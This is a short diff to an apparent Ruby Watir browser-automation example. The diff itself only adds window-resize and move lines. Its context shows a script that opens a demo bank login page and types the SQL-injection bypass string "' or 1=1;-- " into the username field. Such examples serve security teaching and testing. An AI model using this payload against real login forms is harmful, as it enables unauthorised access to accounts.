@@ -186,6 +186,8 @@ btn.click
 require 'watir-webdriver'
 
 browser = Watir::Browser.new :firefox
+browser.window.resize_to(800, 600)
+browser.window.move_to(0, 0)
 browser.goto "http://www.altoromutual.com/bank/login.aspx"
 browser.text_field(name: 'uid').set("' or 1=1;-- ")
 browser.text_field(name: 'passw').set("password")
